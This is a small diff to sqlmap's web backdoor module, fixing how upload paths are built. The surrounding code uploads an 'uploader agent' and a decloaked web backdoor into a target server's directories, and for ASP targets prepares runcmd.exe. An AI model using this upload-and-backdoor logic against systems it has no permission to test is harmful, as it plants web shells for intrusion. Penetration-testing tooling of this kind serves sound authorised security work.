@@ -33,7 +33,7 @@ from lib.core.common import fileToStr
 from lib.core.common import getDirs
 from lib.core.common import getDocRoot
 from lib.core.common import ntToPosixSlashes
-from lib.core.common import isWindowsPath
+from lib.core.common import isWindowsDriveLetterPath
 from lib.core.common import normalizePath
 from lib.core.common import posixToNtSlashes
 from lib.core.common import randomStr
@@ -170,24 +170,26 @@ class Web:
         backdoorName = "tmpb%s.%s" % (randomStr(lowercase=True), self.webApi)
         backdoorStream = decloakToNamedTemporaryFile(os.path.join(paths.SQLMAP_SHELL_PATH, "backdoor.%s_" % self.webApi), backdoorName)
         originalBackdoorContent = backdoorContent = backdoorStream.read()
-        
+
         uploaderName = "tmpu%s.%s" % (randomStr(lowercase=True), self.webApi)
         uploaderContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "uploader.%s_" % self.webApi))
-        
+
         for directory in directories:
             # Upload the uploader agent
             self.__webFileInject(uploaderContent, uploaderName, directory)
-            
-            requestDir  = ntToPosixSlashes(directory).replace(ntToPosixSlashes(kb.docRoot), "/")
-            if isWindowsPath(requestDir):
+            requestDir  = ntToPosixSlashes(directory)
+            if requestDir[-1] != '/':
+                requestDir += '/'
+            requestDir  = requestDir.replace(ntToPosixSlashes(kb.docRoot), "/")
+            if isWindowsDriveLetterPath(requestDir):
                 requestDir = requestDir[2:]
             requestDir  = normalizePath(requestDir)
-            
+
             self.webBaseUrl     = "%s://%s:%d%s" % (conf.scheme, conf.hostname, conf.port, requestDir)
             self.webUploaderUrl = "%s/%s" % (self.webBaseUrl.rstrip('/'), uploaderName)
             self.webUploaderUrl = ntToPosixSlashes(self.webUploaderUrl.replace("./", "/"))
             uplPage, _  = Request.getPage(url=self.webUploaderUrl, direct=True, raise404=False)
-            
+
             if "sqlmap file uploader" not in uplPage:
                 warnMsg  = "unable to upload the uploader "
                 warnMsg += "agent on '%s'" % directory
@@ -198,7 +200,7 @@ class Web:
             infoMsg  = "the uploader agent has been successfully uploaded "
             infoMsg += "on '%s' ('%s')" % (directory, self.webUploaderUrl)
             logger.info(infoMsg)
-            
+
             if self.webApi == "asp":
                 runcmdName = "tmpe%s.exe" % randomStr(lowercase=True)
                 runcmdStream = decloakToNamedTemporaryFile(os.path.join(paths.SQLMAP_SHELL_PATH, 'runcmd.exe_'), runcmdName)
